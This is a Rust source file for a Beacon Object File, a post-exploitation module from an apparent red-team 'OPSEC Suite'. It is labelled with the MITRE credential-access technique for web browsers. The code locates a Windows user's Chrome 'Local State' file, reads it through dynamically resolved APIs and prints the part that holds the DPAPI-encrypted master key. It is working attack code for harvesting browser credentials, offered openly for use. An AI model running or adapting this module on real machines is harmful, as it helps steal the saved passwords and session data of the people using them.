// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Read Chrome Local State file for DPAPI-encrypted master key.
//! No args needed.
#![no_std]
#![cfg_attr(not(test), no_main)]

use core::ffi::c_void;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555.003", name: "Credentials from Web Browsers", tactic: "Credential Access" },
];

const CSIDL_LOCAL_APPDATA: i32 = 0x001C;
const GENERIC_READ: u32 = 0x80000000;
const FILE_SHARE_READ: u32 = 0x00000001;
const OPEN_EXISTING: u32 = 3;
const INVALID_HANDLE_VALUE: usize = usize::MAX;

dfr_fn!(
    sh_get_folder_path_a(
        hwnd: *mut c_void, csidl: i32, h_token: *mut c_void,
        dw_flags: u32, psz_path: *mut u8,
    ) -> i32,
    module = "shell32.dll", api = "SHGetFolderPathA"
);
dfr_fn!(
    create_file_a(
        lp: *const i8, access: u32, share: u32, sec: *mut c_void,
        disp: u32, flags: u32, tmpl: *mut c_void,
    ) -> *mut c_void,
    module = "kernel32.dll", api = "CreateFileA"
);
dfr_fn!(
    read_file(h: *mut c_void, buf: *mut u8, n: u32, read: *mut u32, ov: *mut c_void) -> i32,
    module = "kernel32.dll", api = "ReadFile"
);
dfr_fn!(
    close_handle(h: *mut c_void) -> i32,
    module = "kernel32.dll", api = "CloseHandle"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let mut local = [0u8; 260];
    let r = unsafe {
        sh_get_folder_path_a(core::ptr::null_mut(), CSIDL_LOCAL_APPDATA,
                             core::ptr::null_mut(), 0, local.as_mut_ptr())
    }.map_err(|_| "path failed")?;
    if r != 0 { return Err("path failed"); }

    let base_len = cstr_len(&local, 260);
    let suffix = b"\\Google\\Chrome\\User Data\\Local State\0";
    let mut path = [0u8; 512];
    let plen = base_len + suffix.len() - 1;
    if plen >= 512 { return Err("path too long"); }
    path[..base_len].copy_from_slice(&local[..base_len]);
    path[base_len..base_len + suffix.len()].copy_from_slice(suffix);

    println!("Target: {}", CStr::from_bytes(&path, plen));

    let h = unsafe {
        create_file_a(path.as_ptr() as *const i8, GENERIC_READ,
                      FILE_SHARE_READ, core::ptr::null_mut(),
                      OPEN_EXISTING, 0, core::ptr::null_mut())
    }.map_err(|_| "open failed")?;
    if h as usize == INVALID_HANDLE_VALUE {
        println!("Chrome not installed or Local State missing");
        return Ok(());
    }

    let mut buf = [0u8; 8192];
    let mut bytes_read: u32 = 0;
    let _ = unsafe { read_file(h, buf.as_mut_ptr(), 8192, &mut bytes_read, core::ptr::null_mut()) };
    unsafe { let _ = close_handle(h); };

    // Print first 1024 bytes — will contain "encrypted_key" JSON field
    let display = (bytes_read as usize).min(1024);
    println!("Local State ({} bytes read, first 1024 shown):", bytes_read);
    print_ascii(&buf[..display]);
    Ok(())
}

fn print_ascii(data: &[u8]) {
    let mut line = [0u8; 81];
    let mut col = 0;
    for &b in data {
        line[col] = if b >= 0x20 && b < 0x7F { b } else { b'.' };
        col += 1;
        if col == 80 {
            rustbof::println!("{}", core::str::from_utf8(&line[..col]).unwrap_or("?"));
            col = 0;
        }
    }
    if col > 0 { rustbof::println!("{}", core::str::from_utf8(&line[..col]).unwrap_or("?")); }
}

fn cstr_len(buf: &[u8], max: usize) -> usize {
    let mut i = 0; while i < max && buf[i] != 0 { i += 1; } i
}

struct CStr<'a>(&'a [u8]);
impl<'a> CStr<'a> {
    fn from_bytes(buf: &'a [u8], len: usize) -> Self { Self(&buf[..len]) }
}
impl core::fmt::Display for CStr<'_> {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(core::str::from_utf8(self.0).unwrap_or("?"))
    }
}
